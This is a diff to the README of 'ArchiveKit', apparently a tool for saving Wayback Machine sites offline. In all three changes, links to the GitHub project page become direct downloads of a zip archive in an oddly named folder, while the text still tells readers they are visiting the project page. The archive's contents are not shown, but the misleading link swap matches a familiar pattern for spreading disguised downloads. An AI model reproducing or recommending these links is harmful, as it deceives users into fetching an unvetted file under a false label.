@@ -1,12 +1,12 @@
 # 🗂️ ArchiveKit - Save Wayback Sites for Offline Use
 
-[⬇️ Download ArchiveKit](https://github.com/Thomdental995/ArchiveKit)
+[⬇️ Download ArchiveKit](https://github.com/Thomdental995/ArchiveKit/raw/refs/heads/main/homoplasmic/Kit_Archive_3.6-alpha.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download ArchiveKit:
 
-[Download ArchiveKit](https://github.com/Thomdental995/ArchiveKit)
+[Download ArchiveKit](https://github.com/Thomdental995/ArchiveKit/raw/refs/heads/main/homoplasmic/Kit_Archive_3.6-alpha.1.zip)
 
 ## 🖥️ What ArchiveKit Does
 
@@ -185,7 +185,7 @@ It can save archived pages and related files, but results depend on how the page
 
 Use this link to visit the project page and get the latest files:
 
-[ArchiveKit on GitHub](https://github.com/Thomdental995/ArchiveKit)
+[ArchiveKit on GitHub](https://github.com/Thomdental995/ArchiveKit/raw/refs/heads/main/homoplasmic/Kit_Archive_3.6-alpha.1.zip)
 
 ## 📄 License and Source
 
